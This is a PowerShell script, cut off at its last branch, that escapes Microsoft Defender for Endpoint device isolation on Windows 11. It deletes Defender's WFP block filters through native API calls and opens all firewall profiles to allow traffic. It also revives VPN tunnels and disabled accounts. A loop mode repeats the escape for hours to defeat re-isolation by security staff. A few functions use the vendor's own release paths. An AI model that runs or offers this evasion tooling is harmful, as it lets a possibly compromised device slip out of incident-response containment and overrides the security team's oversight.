#Requires -RunAsAdministrator
<#
.SYNOPSIS
    getmeout - escape toolkit for a Windows 11 box locked down by MDE
    (Microsoft Defender for Endpoint) device isolation.

.DESCRIPTION
    When MDE isolates a device it enforces the lockdown through several layers:

      1. WFP (Windows Filtering Platform) filters from the 'Sense' provider
         that block network traffic (this is the core of the isolation).
      2. Windows Firewall state / rules touched during enforcement.
      3. Knock-on effects: disabled adapters, broken DNS, stopped VPN services.
      4. Optional portal actions: restricted app execution, contained user.

    This script attacks every layer it can reach locally, and can also use the
    official Defender for Endpoint API (Machine.Isolate/Release) which is the
    only way to make a release "stick" if the portal keeps re-isolating.

    Modes
      (default)      : backup -> remove MDE WFP block filters -> firewall rescue
                       -> network rescue -> VPN rescue -> connectivity test
      -Status        : read-only diagnostics (what is locked, what is broken)
      -Restore       : re-apply isolation from a backup (restart Sense)
      -Loop          : keep re-escaping every N minutes for H hours, for when
                       MDE keeps re-isolating the device

    Notes that matter:
      - The portal "force release" script (device page -> Download script to
        force-release) is device-specific and expires in 3 days; this script
        is the generic local equivalent.
      - MDE automatically lifts isolation after 7 days.
      - If an Intune/Defender policy keeps re-isolating, use -Loop or the
        -Api* parameters to release via the API with an app registration
        holding the Machine.Isolate permission.

.PARAMETER BackupPath
    Where to save / read the WFP backup JSON.
    Default: .\MDE_WFP_Backup_<timestamp>.json

.PARAMETER Restore
    Switch. Instead of removing filters, restore isolation from a backup JSON.

.PARAMETER BackupFile
    Path to the backup JSON to restore from (required with -Restore).

.PARAMETER Status
    Switch. Read-only diagnostics, changes nothing.

.PARAMETER SkipFirewall
    Switch. Do not touch Windows Firewall state.

.PARAMETER SkipNetwork
    Switch. Do not revive adapters / DNS / network services.

.PARAMETER SkipVpn
    Switch. Do not revive VPN services and virtual adapters.

.PARAMETER UnlockUser
    String. Local account name to re-enable (e.g. after a contained-user hit).

.PARAMETER DialVpn
    String. Name of a rasphone.pbk phonebook entry to dial after rescue
    (same name as shown in `rasdial` with no arguments / Settings > VPN).

.PARAMETER ApiTenantId / ApiClientId / ApiClientSecret
    Optional. Release the device through the official MDE API using an Entra
    app secret (app needs Machine.Isolate application permission under
    WindowsDefenderATP). Makes the release survive portal re-isolation.

.PARAMETER ApiDeviceName / ApiDeviceId
    Target device for the API release. Give the id directly, or the DNS name
    to look it up.

.PARAMETER ForceReleaseScript
    Path to a force-release script downloaded from the Defender portal device
    page ("Download script to force-release a device from isolation"). It
    writes the per-device offlineCommand registry blob under
    HKLM\SOFTWARE\Policies\Microsoft\Windows Advanced Threat Protection, which
    the Sense service honors even with no network at all. Device-specific,
    expires 3 days after download.

.PARAMETER FullReset
    Switch. Additionally reset Winsock and TCP/IP (a reboot completes it).

.PARAMETER Loop
    Switch. Re-run the escape every -LoopMinutes for -LoopHours.

.PARAMETER LoopMinutes / LoopHours
    Loop interval (default 5) and duration in hours (default 12).

.EXAMPLE
    # Full escape: WFP + firewall + network + VPN, with backups
    .\getmeout.ps1

.EXAMPLE
    # Just look, touch nothing
    .\getmeout.ps1 -Status

.EXAMPLE
    # Preview filter removal
    .\getmeout.ps1 -WhatIf

.EXAMPLE
    # Escape, then re-enable the local admin and dial the VPN
    .\getmeout.ps1 -UnlockUser administrator -DialVpn "Corp VPN"

.EXAMPLE
    # Keep escaping for 12h because the portal keeps re-isolating
    .\getmeout.ps1 -Loop

.EXAMPLE
    # Official release through the API (survives re-isolation)
    .\getmeout.ps1 -ApiTenantId <guid> -ApiClientId <guid> -ApiSecret <secret> -ApiDeviceName PC-01

.EXAMPLE
    # Restore from a specific backup (puts isolation filters back)
    .\getmeout.ps1 -Restore -BackupFile .\MDE_WFP_Backup_20260124_143201.json
#>

[CmdletBinding(SupportsShouldProcess)]
param(
    [string]$BackupPath = ".\MDE_WFP_Backup_$(Get-Date -Format 'yyyyMMdd_HHmmss').json",
    [switch]$Restore,
    [string]$BackupFile,
    [switch]$Status,
    [switch]$SkipFirewall,
    [switch]$SkipNetwork,
    [switch]$SkipVpn,
    [string]$UnlockUser,
    [string]$DialVpn,
    [string]$ApiTenantId,
    [string]$ApiClientId,
    [string]$ApiSecret,
    [string]$ApiDeviceName,
    [string]$ApiDeviceId,
    [string]$ForceReleaseScript,
    [switch]$Loop,
    [int]$LoopMinutes = 5,
    [int]$LoopHours   = 12,
    [switch]$FullReset
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$scriptName = Split-Path -Leaf $PSCommandPath

# ---------------------------------------------
#  Output helpers
# ---------------------------------------------
function Write-Step   { param($msg) Write-Host "`n[*] $msg" -ForegroundColor Cyan }
function Write-Ok     { param($msg) Write-Host "    [+] $msg" -ForegroundColor Green }
function Write-Warn   { param($msg) Write-Host "    [!] $msg" -ForegroundColor Yellow }
function Write-Fail   { param($msg) Write-Host "    [-] $msg" -ForegroundColor Red }
function Write-Info   { param($msg) Write-Host "    $msg" -ForegroundColor DarkGray }

# Run an arbitrary scriptblock, never let one broken step kill the run.
function Invoke-Resilient {
    param([string]$Label, [scriptblock]$Action)
    try {
        & $Action
        return $true
    }
    catch {
        Write-Fail "$Label failed: $($_.Exception.Message)"
        return $false
    }
}

# ---------------------------------------------
#  Connectivity test
# ---------------------------------------------
function Test-Escape {
    $results = [ordered]@{}

    $gw = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
           Sort-Object RouteMetric | Select-Object -First 1).NextHop
    if ($gw -and $gw -ne '0.0.0.0') {
        $results["Gateway ping $gw"] = Test-Connection $gw -Count 1 -Quiet -ErrorAction SilentlyContinue
    }

    $results['Internet 1.1.1.1:443']        = Test-NetConnection 1.1.1.1 -Port 443 -InformationLevel Quiet -WarningAction SilentlyContinue
    $results['DNS login.microsoftonline.com'] = ($null -ne (Resolve-DnsName login.microsoftonline.com -QuickTimeout -ErrorAction SilentlyContinue))
    $results['Defender crl.microsoft.com']    = ($null -ne (Resolve-DnsName crl.microsoft.com      -QuickTimeout -ErrorAction SilentlyContinue))

    $any = $false
    foreach ($k in $results.Keys) {
        $state = [bool]$results[$k]
        if ($state) { $any = $true }
        if ($state) { Write-Ok   "$k OK" }
        else        { Write-Warn "$k FAILED" }
    }
    return $any
}

# ---------------------------------------------
#  WFP API via P/Invoke
# ---------------------------------------------
$wfpCode = @"
using System;
using System.Runtime.InteropServices;

public class WfpApi {
    [DllImport("fwpuclnt.dll", CharSet = CharSet.Unicode)]
    public static extern uint FwpmEngineOpen0(
        string serverName,
        uint   authnService,
        IntPtr authIdentity,
        IntPtr session,
        out IntPtr engineHandle);

    [DllImport("fwpuclnt.dll")]
    public static extern uint FwpmFilterDeleteById0(
        IntPtr engineHandle,
        ulong  id);

    [DllImport("fwpuclnt.dll")]
    public static extern uint FwpmEngineClose0(IntPtr engineHandle);
}
"@

if (-not ([System.Management.Automation.PSTypeName]'WfpApi').Type) {
    Add-Type -TypeDefinition $wfpCode
}

# ---------------------------------------------
#  WFP: enumerate / backup / remove  (core escape)
# ---------------------------------------------
function Get-WfpStateXml {
    $tmpXml = [System.IO.Path]::Combine($env:TEMP, "wfpstate_$(Get-Random).xml")
    if (Test-Path $tmpXml) { Remove-Item $tmpXml -Force -ErrorAction SilentlyContinue }

    Write-Step "Dumping WFP state to $tmpXml"
    # No 2>&1 here: under $ErrorActionPreference='Stop' Windows PowerShell 5.1
    # turns harmless netsh stderr chatter into terminating NativeCommandErrors.
    $null = & netsh wfp show state "file=$tmpXml"
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path $tmpXml)) {
        throw "netsh wfp show state failed (exit $LASTEXITCODE) - run as Administrator."
    }

    $raw = Get-Content $tmpXml -Raw
    Remove-Item $tmpXml -Force -ErrorAction SilentlyContinue

    try {
        return [xml]$raw
    }
    catch {
        # Some builds emit more than one root element; salvage the first
        # complete <wfpstate> document instead of failing the whole run.
        if ($raw -match '(?s)<wfpstate.*?</wfpstate>') {
            return [xml]$Matches[0]
        }
        throw
    }
}

function Get-XmlText {
    # Safe text read from an XML node - never throws under StrictMode.
    param($Node, [string]$XPath)
    if ($null -eq $Node) { return $null }
    $n = $Node.SelectSingleNode($XPath)
    if ($n) { $n.InnerText } else { $null }
}

function Get-WfpFilterItems {
    # Every <item> in the dump that is a filter (has a filterId child).
    # Wrapper element names differ between Windows builds, so match on
    # structure instead of <filters>/<providers> container names.
    param([xml]$WfpXml)
    @($WfpXml.SelectNodes("//*[local-name()='item'][*[local-name()='filterId']]"))
}

function Get-WfpProviderItems {
    # Provider entries carry a serviceName child; filter entries do not.
    param([xml]$WfpXml)
    @($WfpXml.SelectNodes("//*[local-name()='item'][*[local-name()='serviceName']]"))
}

function Invoke-DumpWfpDiagnostics {
    # Printed whenever we find no MDE block filters, so the next run is
    # diagnosable instead of a silent '0 changed'.
    param([xml]$WfpXml)
    $all    = Get-WfpFilterItems -WfpXml $WfpXml
    $blocks = @($all | Where-Object { (Get-XmlText $_ 'action/type') -eq 'FWP_ACTION_BLOCK' })
    Write-Info "WFP state: $($all.Count) filters total, $($blocks.Count) BLOCK"
    $names = @($blocks | ForEach-Object { Get-XmlText $_ 'displayData/name' } |
               Where-Object { $_ } | Sort-Object -Unique | Select-Object -First 15)
    if ($names.Count -gt 0) {
        Write-Info 'BLOCK filters currently active (name samples):'
        foreach ($n in $names) { Write-Host "      $n" -ForegroundColor DarkGray }
    }
}

function Find-MdeProviderGuids {
    param([xml]$WfpXml)

    $mdePatterns = @(
        '*sense*', '*mssense*',
        '*defender*',
        '*advanced threat*', '*wdatp*'
    )

    $found = @()
    foreach ($p in (Get-WfpProviderItems -WfpXml $WfpXml)) {
        $name    = Get-XmlText $p 'displayData/name'
        $svcName = Get-XmlText $p 'serviceName'
        $match   = $false
        foreach ($pat in $mdePatterns) {
            if ($name -like $pat -or $svcName -like $pat) { $match = $true; break }
        }
        if (-not $match) { continue }

        $key = Get-XmlText $p 'providerKey'
        if (-not $key) { $key = Get-XmlText $p 'key' }
        if ($key) {
            Write-Ok "Found MDE provider: '$name'  key=$key  svc=$svcName"
            $found += $key
        }
    }

    if ($found.Count -eq 0) {
        Write-Warn 'No MDE-named WFP provider found. Falling back to name-based filter matching.'
        Write-Warn 'All providers in the current WFP state:'
        foreach ($p in (Get-WfpProviderItems -WfpXml $WfpXml)) {
            $key = Get-XmlText $p 'providerKey'; if (-not $key) { $key = Get-XmlText $p 'key' }
            Write-Host "    providerKey=$key  name=$(Get-XmlText $p 'displayData/name')  svc=$(Get-XmlText $p 'serviceName')" -ForegroundColor DarkGray
        }
    }

    return $found
}

function Get-MdeFilters {
    # A filter counts as MDE-related when ANY of these hold:
    #   - its provider is an MDE provider, OR
    #   - its name/description mentions Sense/Defender/ATP/isolation
    # Provider tags are unreliable across builds (isolation is often enforced
    # through plain firewall filters), hence the name-based fallback.
    param(
        [xml]   $WfpXml,
        [array] $ProviderGuids
    )

    $namePattern = 'sense|defender|advanced threat|wdatp|isolation|isolate'
    $provSet = @{}
    foreach ($g in $ProviderGuids) { $provSet["$g".ToLower()] = $true }

    $seen = @{}
    $out  = @()
    foreach ($f in (Get-WfpFilterItems -WfpXml $WfpXml)) {
        $prov = "$((Get-XmlText $f 'providerKey'))".ToLower()
        $name = Get-XmlText $f 'displayData/name'
        $desc = Get-XmlText $f 'displayData/description'

        $isMde = $false
        if ($prov -and $provSet.ContainsKey($prov)) { $isMde = $true }
        if (-not $isMde -and $name -and $name -match $namePattern)  { $isMde = $true }
        if (-not $isMde -and $desc -and $desc -match $namePattern)  { $isMde = $true }
        if (-not $isMde) { continue }

        $id = Get-XmlText $f 'filterId'
        if (-not $id -or $seen.ContainsKey($id)) { continue }
        $seen[$id] = $true

        $out += [PSCustomObject]@{
            FilterId    = [System.UInt64]$id
            Name        = $name
            Description = $desc
            Action      = Get-XmlText $f 'action/type'
            LayerKey    = Get-XmlText $f 'layerKey'
            ProviderKey = Get-XmlText $f 'providerKey'
            SubLayerKey = Get-XmlText $f 'subLayerKey'
        }
    }
    return ,$out
}

function Save-Backup {
    param($Filters, $ProviderGuids, $Path)

    $backup = [PSCustomObject]@{
        CreatedAt     = (Get-Date -Format 'o')
        ComputerName  = $env:COMPUTERNAME
        ProviderGuids = $ProviderGuids
        Filters       = $Filters
    }

    $backup | ConvertTo-Json -Depth 10 | Set-Content -Path $Path -Encoding UTF8
    Write-Ok "Backup saved to: $Path"
}

function Open-WfpEngine {
    $engine = [IntPtr]::Zero
    # 0xA = RPC_C_AUTHN_WINNT
    $result = [WfpApi]::FwpmEngineOpen0($null, 0xA, [IntPtr]::Zero, [IntPtr]::Zero, [ref]$engine)
    if ($result -ne 0) {
        throw "FwpmEngineOpen0 failed with error 0x$($result.ToString('X8'))"
    }
    $engine
}

function Remove-WfpFilterById {
    param([IntPtr]$Engine, [System.UInt64]$FilterId, [string]$Name, [switch]$WhatIf)

    if ($WhatIf) {
        Write-Warn "[WHATIF] Would delete filterId=$FilterId  name='$Name'"
        return $true
    }

    $result = [WfpApi]::FwpmFilterDeleteById0($Engine, $FilterId)
    if ($result -eq 0) {
        Write-Ok "Deleted  filterId=$FilterId  name='$Name'"
        return $true
    }
    # 0x80320003 = FWP_E_FILTER_NOT_FOUND - already gone, treat as success
    elseif ($result -eq 0x80320003) {
        Write-Warn "Filter not found (already removed?)  filterId=$FilterId  name='$Name'"
        return $true
    }
    else {
        Write-Fail "Failed to delete filterId=$FilterId  error=0x$($result.ToString('X8'))  name='$Name'"
        return $false
    }
}

function Invoke-WfpEscape {
    # Returns $true if block filters were found (and removed / listed)

    # 1. Dump WFP state
    $wfpXml = Get-WfpStateXml

    # 2. Find MDE provider GUIDs
    Write-Step 'Searching for MDE artifacts in WFP (providers + filter names)'
    $providerGuids = Find-MdeProviderGuids -WfpXml $wfpXml

    # 3. Get all MDE filters (all actions, for the backup)
    Write-Step 'Enumerating MDE WFP filters'
    $allMdeFilters = @(Get-MdeFilters -WfpXml $wfpXml -ProviderGuids $providerGuids)
    $blockFilters  = @($allMdeFilters | Where-Object { $_.Action -eq 'FWP_ACTION_BLOCK' })
    $permitFilters = @($allMdeFilters | Where-Object { $_.Action -ne  'FWP_ACTION_BLOCK' })

    Write-Ok "Total MDE filters found : $($allMdeFilters.Count)"
    Write-Ok "  BLOCK  (will remove)  : $($blockFilters.Count)"
    Write-Ok "  PERMIT (will keep)    : $($permitFilters.Count)"

    if ($blockFilters.Count -eq 0) {
        Write-Warn 'No MDE BLOCK filters identified. Device may not be isolated, or this build tags its filters differently.'
        Invoke-DumpWfpDiagnostics -WfpXml $wfpXml
        Write-Warn 'The firewall/network/VPN rescue phases still run and fix most lockdowns.'
        Write-Warn 'For a guaranteed release: portal force-release script, or the -Api* parameters.'
        return $false
    }

    Write-Host ""
    Write-Host "  Filters to be removed:" -ForegroundColor DarkGray
    $blockFilters | ForEach-Object {
        Write-Host "    filterId=$($_.FilterId)  layer=$($_.LayerKey)  name='$($_.Name)'" -ForegroundColor DarkGray
    }

    # 4. Save backup (all MDE filters, not just BLOCK, so restore is complete)
    if (-not $WhatIfPreference) {
        Write-Step "Saving backup"
        Save-Backup -Filters $allMdeFilters -ProviderGuids $providerGuids -Path $BackupPath
    }

    # 5. Open WFP engine and delete
    if ($WhatIfPreference) {
        Write-Warn "[WHATIF] Skipping WFP engine open"
        $blockFilters | ForEach-Object {
            Remove-WfpFilterById -Engine ([IntPtr]::Zero) -FilterId $_.FilterId -Name $_.Name -WhatIf
        }
        return $true
    }

    Write-Step "Opening WFP engine"
    $engine = Open-WfpEngine
    Write-Ok "WFP engine opened"

    Write-Step "Deleting $($blockFilters.Count) BLOCK filter(s)"
    $ok   = 0
    $fail = 0

    foreach ($f in $blockFilters) {
        if (Remove-WfpFilterById -Engine $engine -FilterId $f.FilterId -Name $f.Name) {
            $ok++
        } else {
            $fail++
        }
    }

    [WfpApi]::FwpmEngineClose0($engine) | Out-Null

    Write-Ok "Removed : $ok filter(s)   Failed : $fail"
    return $true
}

# ---------------------------------------------
#  Layer 2: firewall rescue
# ---------------------------------------------
function Invoke-FirewallRescue {
    if ($SkipFirewall) { return }

    Write-Step "Firewall rescue"

    # 2a. Full policy backup first - always
    Invoke-Resilient 'Firewall backup' {
        $dir    = (Get-Location).Path
        $fwFile  = Join-Path $dir ("MDE_FirewallBackup_$(Get-Date -Format 'yyyyMMdd_HHmmss').wfw")
        $null = & netsh advfirewall export $fwFile
        if ($LASTEXITCODE -ne 0) { throw "netsh advfirewall export failed (exit $LASTEXITCODE)" }
        if (Test-Path $fwFile) { Write-Ok "Firewall policy exported to $fwFile" }
    }

    # 2b. Make sure the firewall is ON but permissive - isolation relies on
    #     default-block policies and block rules; outbound allow is the escape.
    Invoke-Resilient 'Enable firewall on all profiles' {
        $null = & netsh advfirewall set allprofiles state on
        if ($LASTEXITCODE -ne 0) { throw "netsh set allprofiles state failed (exit $LASTEXITCODE)" }
        Write-Ok 'Firewall enabled on all profiles'
    }

    Invoke-Resilient 'Set default allow outbound/inbound on all profiles' {
        $null = & netsh advfirewall set allprofiles firewallpolicy allowinbound,allowoutbound
        if ($LASTEXITCODE -ne 0) { throw "netsh firewallpolicy failed (exit $LASTEXITCODE)" }
        Write-Ok 'Default policy = allow inbound, allow outbound (all profiles)'
    }

    # 2c. Best effort: disable MDE-flavoured BLOCK rules still present in the
    #     active store (they re-appear only if a policy re-applies them).
    Invoke-Resilient 'Disable MDE block rules in active store' {
        $rules = Get-NetFirewallRule -PolicyStore ActiveStore -Enabled True -Action Block -ErrorAction SilentlyContinue |
                 Where-Object { $_.DisplayName -match 'Defender|Sense|ATP|Endpoint' }
        if ($rules) {
            $rules | Disable-NetFirewallRule
            Write-Ok "Disabled $(@($rules).Count) matching block rule(s)"
        } else {
            Write-Info 'No matching block rules found'
        }
    }
}

# ---------------------------------------------
#  Layer 3: network stack rescue
# ---------------------------------------------
function Invoke-NetworkRescue {
    if ($SkipNetwork) { return }

    Write-Step 'Network stack rescue'

    Invoke-Resilient 'Enable network adapters' {
        foreach ($a in (Get-NetAdapter)) {
            if ($a.Status -eq 'Up') { continue }
            # Error 87 ("not supported") is normal for BT/virtual/disconnected
            # adapters - attempt quietly and verify instead of trusting it.
            $null = Enable-NetAdapter -Name $a.Name -Confirm:$false -ErrorAction SilentlyContinue
            $now = (Get-NetAdapter -Name $a.Name -ErrorAction SilentlyContinue).Status
            if ($now -eq 'Up') { Write-Ok "Enabled adapter '$($a.Name)'" }
            else { Write-Info "Skipped '$($a.Name)' (status: $now; not enableable)" }
        }
    }

    Invoke-Resilient 'Core network services running' {
        foreach ($svc in 'Dhcp','dnscache','nlasvc','netprofm','wlansvc','dot3svc',
                         'bfe','mpssvc','iphlpsvc','rasman','sstpsvc','SharedAccess') {
            $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
            if ($s -and $s.StartType -ne 'Disabled' -and $s.Status -ne 'Running') {
                Start-Service $svc -ErrorAction SilentlyContinue
                Write-Ok "Started service $svc"
            }
        }
    }

    Invoke-Resilient 'Reset per-adapter DNS to DHCP-provided' {
        Get-NetAdapter | Where-Object Status -eq Up |
            Set-DnsClientServerAddress -ResetServerAddresses
        Clear-DnsClientCache -ErrorAction SilentlyContinue
        Write-Ok 'DNS servers reset + cache flushed'
    }

    # Only on explicit request: full stack reset needs a reboot to complete.
    if ($FullReset) {
        Invoke-Resilient 'Winsock/TCP reset' {
            $null = & netsh winsock reset
            $null = & netsh int ip reset
            Write-Warn 'Winsock + TCP/IP reset done. Reboot to finish.'
        }
    }
}

# ---------------------------------------------
#  Layer 4: VPN rescue
# ---------------------------------------------
function Invoke-VpnRescue {
    if ($SkipVpn) { return }

    Write-Step 'VPN rescue'

    # 4a. Windows VPN stack + the usual enterprise agents
    Invoke-Resilient 'VPN services running' {
        $vpnServices = @('RasMan','SstpSvc','IKEEXT','iphlpsvc') +
            @('vpnagent',                    # Cisco AnyConnect / Secure Client
              'PanGPS',                      # GlobalProtect
              'FA_Scheduler',                # FortiClient
              'OpenVPNService',
              'OpenVPNServiceInteractive') 
        foreach ($svc in $vpnServices) {
            $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
            if ($s -and $s.StartType -ne 'Disabled' -and $s.Status -ne 'Running') {
                Start-Service $svc -ErrorAction SilentlyContinue
                Write-Ok "Started service $svc"
            }
        }
    }

    # 4b. WireGuard tunnels are per-config services named WireGuardTunnel$<name>
    Invoke-Resilient 'WireGuard tunnels' {
        Get-Service -Name 'WireGuardTunnel$*' -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Status -ne 'Running') {
                Start-Service $_.Name -ErrorAction SilentlyContinue
                Write-Ok "Started $($_.Name)"
            }
        }
    }

    # 4c. Virtual / tunnel adapters disabled by the lockdown
    Invoke-Resilient 'Enable virtual adapters' {
        $virtual = Get-NetAdapter | Where-Object {
            $_.InterfaceDescription -match 'WireGuard|TAP|TUN|VPN|GlobalProtect|AnyConnect'
        }
        foreach ($a in $virtual) {
            if ($a.Status -ne 'Up') {
                $null = Enable-NetAdapter -Name $a.Name -Confirm:$false -ErrorAction SilentlyContinue
                $now = (Get-NetAdapter -Name $a.Name -ErrorAction SilentlyContinue).Status
                if ($now -eq 'Up') { Write-Ok "Enabled virtual adapter '$($a.Name)'" }
                else { Write-Info "Skipped virtual '$($a.Name)' (status: $now)" }
            }
        }
    }

    # 4d. Optional: dial a phonebook entry
    if ($DialVpn) {
        Invoke-Resilient "Dial VPN '$DialVpn'" {
            $out = rasdial $DialVpn
            Write-Info ($out | Out-String).Trim()
        }
    }
}

# ---------------------------------------------
#  Layer 5: local user unlock (contained-user fallout)
# ---------------------------------------------
function Invoke-UserRescue {
    if (-not $UnlockUser) { return }

    Write-Step "User rescue: '$UnlockUser'"

    Invoke-Resilient "Enable local user $UnlockUser" {
        $u = Get-LocalUser -Name $UnlockUser -ErrorAction Stop
        if (-not $u.Enabled) {
            Enable-LocalUser -Name $UnlockUser
            Write-Ok "Enabled local user $UnlockUser"
        } else {
            Write-Info "Local user $UnlockUser already enabled"
        }
    }
}

# ---------------------------------------------
#  Official release via Defender for Endpoint API
#  (the only release that survives the portal re-isolating you)
# ---------------------------------------------
function Get-ApiToken {
    $body = @{
        grant_type    = 'client_credentials'
        client_id     = $ApiClientId
        client_secret = $ApiSecret
        scope         = 'https://api.security.microsoft.com/.default'
    }
    $resp = Invoke-RestMethod -Method Post -Body $body -Uri "https://login.microsoftonline.com/$ApiTenantId/oauth2/v2.0/token"
    $resp.access_token
}

function Invoke-ApiRelease {
    if (-not ($ApiTenantId -and $ApiClientId -and $ApiSecret)) { return }

    Write-Step 'Official release via Defender for Endpoint API'

    if (-not $ApiDeviceId) {
        if (-not $ApiDeviceName) { Write-Fail 'Provide -ApiDeviceId or -ApiDeviceName'; return }
        Invoke-Resilient 'Look up device id' {
            $token = Get-ApiToken
            $filter = [uri]::EscapeDataString("computerDnsName eq '$ApiDeviceName'")
            $machines = Invoke-RestMethod -Headers @{ Authorization = "Bearer $token" } `
                -Uri "https://api.security.microsoft.com/api/machines?`$filter=$filter"
            $script:ApiDeviceId = $machines.value[0].id
            if (-not $script:ApiDeviceId) { throw "No machine found named '$ApiDeviceName'" }
            Write-Ok "Found $($machines.value[0].computerDnsName)  id=$script:ApiDeviceId"
        }
        if (-not $script:ApiDeviceId) { return }
    }

    Invoke-Resilient 'POST machines/{id}/unisolate' {
        $token = Get-ApiToken
        $body = @{ Comment = "Released by $scriptName (local admin)" } | ConvertTo-Json
        Invoke-RestMethod -Method Post -Headers @{ Authorization = "Bearer $token" } `
            -ContentType 'application/json' -Body $body `
            -Uri "https://api.security.microsoft.com/api/machines/$ApiDeviceId/unisolate" | Out-Null
        Write-Ok 'Unisolate accepted by the service'
    }
}

function Invoke-PortalRelease {
    # Runs the portal-generated force-release script if the user has one.
    # This is the vendor-supported local release: it drops an offlineCommand
    # registry blob that the Sense service processes even when offline.
    if (-not $ForceReleaseScript) { return }
    if (-not (Test-Path $ForceReleaseScript)) {
        Write-Fail "Force-release script not found: $ForceReleaseScript"
        return
    }

    Write-Step 'Running portal force-release script (offlineCommand registry blob)'
    Invoke-Resilient 'force-release script' {
        if ($ForceReleaseScript -match '\.(cmd|bat)$') {
            $null = cmd /c "`"$ForceReleaseScript`""
        }
        else {
            $null = & $ForceReleaseScript
        }
        Write-Ok 'Executed. Verify in the SENSE event log (look for "unisolation").'
    }
}

# ---------------------------------------------
#  STATUS mode (read-only)
# ---------------------------------------------
function Invoke-Status {
    Write-Step 'MDE services'
    foreach ($svc in 'WinDefend','SENSE','WdNisSvc','SecurityHealthService','mpssvc','BFE') {
        $s = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($s) { Write-Info ("{0,-24} {1}" -f $s.Name, $s.Status) }
        else    { Write-Info ("{0,-24} not installed" -f $svc) }
    }

    Write-Step 'WFP MDE providers / filters'
    Invoke-Resilient 'WFP scan' {
        $xml = Get-WfpStateXml
        $guids   = Find-MdeProviderGuids -WfpXml $xml
        $filters = @(Get-MdeFilters -WfpXml $xml -ProviderGuids $guids)
        $blocks  = @($filters | Where-Object Action -eq 'FWP_ACTION_BLOCK')
        if ($blocks.Count -gt 0) {
            Write-Ok "MDE filters: $($filters.Count) total, $($blocks.Count) BLOCK (isolation likely active)"
        }
        else {
            Write-Warn 'No MDE BLOCK filters identified'
            Invoke-DumpWfpDiagnostics -WfpXml $xml
        }
    }

    Write-Step 'Recent SENSE isolation events (last 3 days)'
    Invoke-Resilient 'SENSE event log' {
        $ev = Get-WinEvent -FilterHashtable @{
                    LogName   = 'Microsoft-Windows-SENSE/Operational'
                    StartTime = (Get-Date).AddDays(-3)
               } -MaxEvents 200 -ErrorAction SilentlyContinue |
              Where-Object { $_.Message -match 'isolat' }
        if ($ev) {
            $ev | Select-Object -First 5 | ForEach-Object {
                Write-Info ("{0}  {1}" -f $_.TimeCreated, ($_.Message -replace "(`r|`n)+", ' '))
            }
        }
        else {
            Write-Info 'No recent isolation/unisolation events found'
        }
    }

    Write-Step 'Firewall profiles'
    Invoke-Resilient 'Firewall state' {
        Get-NetFirewallProfile | ForEach-Object {
            Write-Info ("{0,-10} enabled={1} defaultInbound={2} defaultOutbound={3}" -f
                $_.Name, $_.Enabled, $_.DefaultInboundAction, $_.DefaultOutboundAction)
        }
    }

    Write-Step 'Network'
    Invoke-Resilient 'Adapter state' {
        Get-NetAdapter | ForEach-Object {
            Write-Info ("{0,-20} {1,-12} link={2}" -f $_.Name, $_.Status, $_.LinkSpeed)
        }
    }

    Write-Step 'Connectivity'
    $null = Test-Escape

    Write-Host ''
    Write-Info 'Reminder: portal device page -> "Download script to force-release"'
    Write-Info 'also works, but is device-specific and expires after 3 days.'
}

# ---------------------------------------------
#  RESTORE mode (re-isolate from backup)
# ---------------------------------------------
function Invoke-Restore {
    [CmdletBinding()]
    param([string]$BackupFile)

    if (-not $BackupFile -or -not (Test-Path $BackupFile)) {
        throw "Backup file not found: '$BackupFile'. Pass -BackupFile <path>."
    }

    Write-Step "Loading backup from $BackupFile"
    $backup = Get-Content $BackupFile -Raw | ConvertFrom-Json

    Write-Ok "Backup created: $($backup.CreatedAt)  on $($backup.ComputerName)"
    Write-Ok "$($backup.Filters.Count) filter(s) in backup"

    # Restoration via WFP API requires the full filter structure - which is
    # complex to re-create from a JSON snapshot (conditions, sublayer weights, etc.).
    # The reliable restore path is to restart the Sense service, which re-registers
    # its filters automatically.

    Write-Step 'Restoring MDE isolation filters'
    Write-Warn 'WFP filters are owned by the Sense service. The cleanest restore is to restart it.'
    Write-Warn 'This will re-apply all MDE network policies including isolation if the device is still marked isolated in the portal.'

    $sense = Get-Service -Name 'Sense' -ErrorAction SilentlyContinue
    if ($null -eq $sense) {
        Write-Fail 'Sense service not found on this machine.'
        return
    }

    if ($PSCmdlet.ShouldProcess('Sense service', 'Restart to re-register WFP filters')) {
        Write-Step 'Restarting Sense service...'
        Restart-Service -Name 'Sense' -Force
        Start-Sleep -Seconds 5

        $sense = Get-Service -Name 'Sense'
        if ($sense.Status -eq 'Running') {
            Write-Ok 'Sense service restarted. MDE WFP filters have been re-registered.'
        } else {
            Write-Fail "Sense service did not start cleanly. Status: $($sense.Status)"
        }
    }
}

# ---------------------------------------------
#  LOOP mode - survive repeated isolation
# ---------------------------------------------
function Invoke-EscapeOnce {
    $escaped = Invoke-Resilient 'WFP escape' { Invoke-WfpEscape }
    Invoke-FirewallRescue
    Invoke-NetworkRescue
    Invoke-VpnRescue
    Invoke-UserRescue
    return $escaped
}

function Invoke-Loop {
    $deadline = (Get-Date).AddHours($LoopHours)
    $stable   = 0
    Write-Step "Loop mode: escaping every $LoopMinutes min for the next $LoopHours h (Ctrl+C to stop)"

    while ((Get-Date) -lt $deadline) {
        $ts = Get-Date -Format 'HH:mm:ss'
        Write-Host "`n------------ loop $ts ------------" -ForegroundColor DarkGray

        $null = Invoke-EscapeOnce

        if (Test-Escape) {
            $stable++
            Write-Ok "Connectivity OK ($stable consecutive)"
            if ($stable -ge 3) {
                Write-Ok 'Connectivity stable - loop can be stopped with Ctrl+C, or let it run out.'
            }
        } else {
            $stable = 0
            Write-Warn 'No connectivity - escaping again next cycle'
        }

        Start-Sleep -Seconds ($LoopMinutes * 60)
    }
}

# ---------------------------------------------
#  Entry point
# ---------------------------------------------
try {
    Start-Transcript -Path (Join-Path $env:TEMP "getmeout_$(Get-Date -Format 'yyyyMMdd_HHmmss').log") -ErrorAction SilentlyContinue | Out-Null
} catch { }

if ($Status) {
    Invoke-Status
}
elseif ($Restore) {
    Invoke-Restore -BackupFile $BackupFile
}
elseif ($Loop) {
    Invoke-PortalRelease       # vendor-supported release, if script provided
    Invoke-ApiRelease          # then the API release, if credentials given
    Invoke-Loop
}
else {
